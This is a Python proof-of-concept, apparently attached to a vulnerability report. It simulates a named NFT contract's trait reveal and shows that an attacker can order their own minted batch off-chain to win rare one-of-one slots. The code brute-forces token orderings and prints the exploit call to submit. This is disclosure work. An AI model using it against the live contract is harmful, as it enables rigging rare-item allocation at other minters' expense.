#!/usr/bin/env python3
"""Faithful simulation of Dealers.sh DealersNFT trait-reveal -> proves the reveal is deterministic AND
attacker-orderable (github.com/Dealers-sh/dealers-contracts, DealersNFT.sol:288-359, live on Abstract 2741
at 0x610CcEe1AE4aFF961d043faB379491C2997383F7).

The bug: _revealOrReanchor seeds the pool draw with keccak256(abi.encodePacked(blockhash(rb), tokenId)) --
NO msg.sender (the contract comment even says so) -- and resolveMany(tokenId[]) draws the caller's array in
the CALLER'S ORDER over a shared, mutable lazy Fisher-Yates pool. Once blockhash(rb) is public (2 blocks
after mint), an attacker who minted a batch can, OFF-CHAIN and at zero cost, simulate every ordering of their
own tokenIds and submit (via resolveMany) the exact order that lands one of their tokens on a known-valuable
pool slot (the one-of-ones are pre-populated by the team in DealerRendererSVG.oneOfOnes well before the pool
is drawn). This replays the EXACT on-chain integer math with a real keccak256.

    python3 poc_sim.py     # needs eth_hash OR pycryptodome for keccak256 (both present in this env)

Read-only proof (no chain writes). See FINDING.md.
"""
try:
    from eth_hash.auto import keccak
except Exception:
    from Crypto.Hash import keccak as _k
    def keccak(b): h = _k.new(digest_bits=256); h.update(b); return h.digest()

from itertools import permutations


def seed_of(bh32: bytes, token_id: int) -> int:
    # abi.encodePacked(bytes32 bh, uint256 tokenId) = 32 bytes + 32 bytes, then keccak256 -> uint256
    return int.from_bytes(keccak(bh32 + token_id.to_bytes(32, "big")), "big")


def draw_pool(seed: int, pool_remaining: int, pool_cache: dict):
    """Exact port of DealersNFT._drawPool (lazy Fisher-Yates). Mutates pool_cache; returns (poolIndex, new_remaining)."""
    n = pool_remaining
    assert n > 0, "PoolExhausted"
    i = seed % n
    last = n - 1
    vi = pool_cache.get(i, 0)
    val_i = i if vi == 0 else vi - 1
    if i != last:
        vl = pool_cache.get(last, 0)
        val_last = last if vl == 0 else vl - 1
        pool_cache[i] = val_last + 1
    return val_i + 1, last  # 1-based poolIndex


def resolve_order(order, bh32, pool_remaining, pool_cache):
    """Resolve a list of tokenIds IN ORDER (as resolveMany does). Returns {tokenId: poolIndex}."""
    pc = dict(pool_cache)
    pr = pool_remaining
    out = {}
    for tid in order:
        idx, pr = draw_pool(seed_of(bh32, tid), pr, pc)
        out[tid] = idx
    return out


if __name__ == "__main__":
    # A model pool region (real live pool_remaining was 9523; we use a small one so all permutations run fast
    # and a rare slot is reachable -- the mechanism is identical at any size). Rare "one-of-one" slots = the
    # top of the range, pre-set by the team (mirrors DealerRendererSVG.oneOfOnes populated ahead of draws).
    POOL_REMAINING = 20
    RARE = {18, 19, 20}                       # known-valuable pool indices (public, readable on-chain)
    bh32 = keccak(b"public blockhash of the reveal block")   # any fixed, publicly-known blockhash
    batch = [5001, 5002, 5003, 5004, 5005]    # the attacker's own freshly-minted batch (<=MAX_PER_WALLET=10)

    print("Attacker batch:", batch, "| rare slots:", sorted(RARE), "| pool_remaining:", POOL_REMAINING)
    print("-" * 92)

    # 1) DETERMINISM + ORDER-DEPENDENCE: the same batch in two different orders -> different assignments
    a = resolve_order(batch, bh32, POOL_REMAINING, {})
    b = resolve_order(list(reversed(batch)), bh32, POOL_REMAINING, {})
    print("order A (as-is)   :", a)
    print("order B (reversed):", b, "  <- same tokens, DIFFERENT slots => order is the lever")

    # 2) ATTACKER OPTIMISES: enumerate every ordering of the OWN batch (all off-chain, free), pick the one
    #    that lands one of their tokens on the rarest reachable slot, then submit that exact order.
    best = None
    for order in permutations(batch):
        res = resolve_order(list(order), bh32, POOL_REMAINING, {})
        hit = [(tid, idx) for tid, idx in res.items() if idx in RARE]
        if hit:
            rarest = max(idx for _, idx in hit)
            if best is None or rarest > best[0]:
                best = (rarest, order, res, hit)
    print("-" * 92)
    if best:
        rarest, order, res, hit = best
        print("EXPLOIT: submit resolveMany(%s)" % list(order))
        print("  -> assignments: %s" % res)
        print("  -> lands token %d on RARE slot %d (a known one-of-one) -- risk-free, chosen before committing"
              % (hit[0][0], rarest))
    else:
        print("no rare slot reachable for this batch/seed (attacker simply retries next mint -- still free)")
    print("-" * 92)
    print("Root cause: seed excludes msg.sender + resolveMany honours caller order over a public, mutable pool")
    print("=> the reveal is fully pre-computable and orderable; the rarest tier is grindable at zero cost.")
